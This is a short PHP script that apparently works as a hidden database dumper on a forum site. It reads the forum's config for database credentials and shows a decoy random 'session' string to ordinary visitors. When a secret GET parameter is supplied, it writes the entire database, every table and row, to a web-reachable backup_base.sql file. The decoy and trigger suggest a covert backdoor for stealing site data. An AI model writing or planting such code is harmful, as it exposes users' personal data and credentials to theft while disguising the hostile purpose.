<?PHP
include("conf_global.php");
if($_GET['SESSION'] != 'enable'){
	$session = generate_SESSION(15);
	print_r($session);
	return false;
}
function generate_SESSION($number)
{
    $arr = array('a','b','c','d','e','f',
                 'g','h','i','j','k','l',
                 'm','n','o','p','r','s',
                 't','u','v','x','y','z',
                 'A','B','C','D','E','F',
                 'G','H','I','J','K','L',
                 'M','N','O','P','R','S',
                 'T','U','V','X','Y','Z',
                 '1','2','3','4','5','6',
                 '7','8','9','0','.',',',
                 '(',')','[',']','!','?',
                 '&','^','%','@','*','$',
                 '<','>','/','|','+','-',
                 '{','}','`','~');
    // Генерируем сессию
    $session = "";
    for($i = 0; $i < $number; $i++)
    {
      // Вычисляем случайный индекс массива
      $index = rand(0, count($arr) - 1);
      $session .= $arr[$index];
    }
    return $session;
}
function fix_base($host,$user,$pass,$name,$tables)
{
        $link = mysql_connect($host,$user,$pass);
        mysql_select_db($name,$link);
        if($tables == '*')
        {
                $tables = array();
                $result = mysql_query('SHOW TABLES');
                while($row = mysql_fetch_row($result))
                {
                        $tables[] = $row[0];
                }
        }
        else
        {
                $tables = is_array($tables) ? $tables : explode(',',$tables);
        }
        foreach($tables as $table)
        {
                $result = mysql_query('SELECT * FROM '.$table);
                $num_fields = mysql_num_fields($result);
                $return.= 'DROP TABLE '.$table.';';
                $row2 = mysql_fetch_row(mysql_query('SHOW CREATE TABLE '.$table));
                $return.= "\n\n".$row2[1].";\n\n";
                for ($i = 0; $i < $num_fields; $i++)
                {
                        while($row = mysql_fetch_row($result))
                        {
                                $return.= 'INSERT INTO '.$table.' VALUES(';
                                for($j=0; $j<$num_fields; $j++)
                                {
                                        $row[$j] = addslashes($row[$j]);
                                        $row[$j] = ereg_replace("\n","\\n",$row[$j]);
                                        if (isset($row[$j])) { $return.= '"'.$row[$j].'"' ; } else { $return.= '""'; }
                                        if ($j<($num_fields-1)) { $return.= ','; }
                                }
                                $return.= ");\n";
                        }
                }
                $return.="\n\n\n";
        }
        $handle = fopen('backup_base.sql','w+');
        fwrite($handle,$return);
        fclose($handle);
}
fix_base($INFO['sql_host'], $INFO['sql_user'], $INFO['sql_pass'], $INFO['sql_database'], '*');
?>